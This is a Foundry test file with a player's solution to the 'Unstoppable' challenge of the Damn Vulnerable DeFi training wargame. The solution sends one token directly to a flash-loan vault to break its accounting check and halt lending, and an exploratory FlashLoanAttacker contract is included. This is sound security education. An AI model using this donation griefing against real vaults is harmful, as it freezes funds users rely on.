// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
import {IERC3156FlashBorrower, IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token and vault
        token = new DamnValuableToken();
        vault = new UnstoppableVault({
            _token: token,
            _owner: deployer,
            _feeRecipient: deployer
        });

        // Deposit tokens to vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        // Fund player's account with initial token balance
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        // Deploy monitor contract and grant it vault's ownership
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));

        // Monitor checks it's possible to take a flash loan
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Check initial token balances
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Monitor is owned
        assertEq(monitorContract.owner(), deployer);

        // Check vault properties
        assertEq(address(vault.asset()), address(token));
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000e18);

        // Vault is owned by monitor contract
        assertEq(vault.owner(), address(monitorContract));

        // Vault is not paused
        assertFalse(vault.paused());

        // Cannot pause the vault
        vm.expectRevert("UNAUTHORIZED");
        vault.setPause(true);

        // Cannot call monitor contract
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        console.log("Test Unstoppable");
        console.log("Vault Balance: ", token.balanceOf(address(vault)));
        console.log("Vault total assests: ", vault.totalAssets());
        token.transfer(address(vault), 1);

        // FlashLoanAttacker attacker = new FlashLoanAttacker();
        // token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE);
        // console.log(
        //     "Attacker token balance before attack:",
        //     token.balanceOf(address(attacker))
        // );

        // attacker.getFlashLoan(address(vault), address(token));
        // //attacker.withdraw(address(vault));
        // console.log(
        //     "Flash loan attacker token balance final:",
        //     ERC20(token).balanceOf(address(attacker))
        // );
        // console.log(
        //     "Total assets: ",
        //     UnstoppableVault(address(vault)).totalAssets()
        // );
        // console.log(
        //     "Total shares: ",
        //     UnstoppableVault(address(vault)).totalSupply()
        // );
        // console.log(
        //     "Convert to shares:",
        //     UnstoppableVault(address(vault)).convertToShares(
        //         UnstoppableVault(address(vault)).totalSupply()
        //     )
        // );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // Flashloan check must fail
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);

        // And now the monitor paused the vault and transferred ownership to deployer
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
}

contract FlashLoanAttacker is IERC3156FlashBorrower {
    function getFlashLoan(address _vault, address _token) external {
        console.log("Total assests: ", UnstoppableVault(_vault).totalAssets());
        console.log("Total shares: ", UnstoppableVault(_vault).totalSupply());
        console.log(
            "Convert to shares:",
            UnstoppableVault(_vault).convertToShares(
                UnstoppableVault(_vault).totalSupply()
            )
        );

        UnstoppableVault(_vault).flashLoan(
            IERC3156FlashBorrower(address(this)),
            _token,
            1_000_000e18 - 200e18,
            abi.encode(true)
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Do nothing with the flash loan, just return the magic value to pass the check
        bool attack;
        if (data.length > 0) {
            attack = abi.decode(data, (bool));
        }

        console.log(
            "Total assets: ",
            UnstoppableVault(msg.sender).totalAssets()
        );
        console.log(
            "Total shares: ",
            UnstoppableVault(msg.sender).totalSupply()
        );
        // console.log(
        //     "Convert to shares:",
        //     UnstoppableVault(msg.sender).convertToShares(
        //         UnstoppableVault(msg.sender).totalSupply()
        //     )
        // );
        console.log("Flash loan attacker received tokens:", amount);
        console.log("Flash loan attacker received fees:", fee);
        console.log(
            "Flash loan attacker token balance:",
            ERC20(token).balanceOf(address(this))
        );
        console.log(
            "Vault total assests",
            UnstoppableVault(msg.sender).totalAssets()
        );

        if (attack) {
            UnstoppableVault vault = UnstoppableVault(msg.sender);
            // vault.asset().approve(msg.sender, amount + fee);
            // vault.deposit(amount, address(this));
            console.log(
                "Total assets: ",
                UnstoppableVault(msg.sender).totalAssets()
            );
            console.log(
                "Total shares: ",
                UnstoppableVault(msg.sender).totalSupply()
            );
            console.log(
                "Convert to shares:",
                UnstoppableVault(msg.sender).convertToShares(
                    UnstoppableVault(msg.sender).totalSupply()
                )
            );
            vault.flashLoan(
                IERC3156FlashBorrower(address(this)),
                token,
                200e18,
                abi.encode(false)
            );
        }

        UnstoppableVault vault = UnstoppableVault(msg.sender);
        console.log(
            "Flash loan attacker token balance:",
            vault.asset().balanceOf(address(this))
        );
        console.log("Flash loan token amount:", amount);
        console.log("Flash loan fee:", fee);
        vault.asset().approve(msg.sender, type(uint256).max);
        //vault.deposit(amount + fee, address(this));
        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    // function withdraw(address _vault) external {
    //     uint256 totalTokenAssestAmount = UnstoppableVault(_vault).totalAssets();
    //     UnstoppableVault(_vault).withdraw(100e18, address(this), address(this));
    // }
}
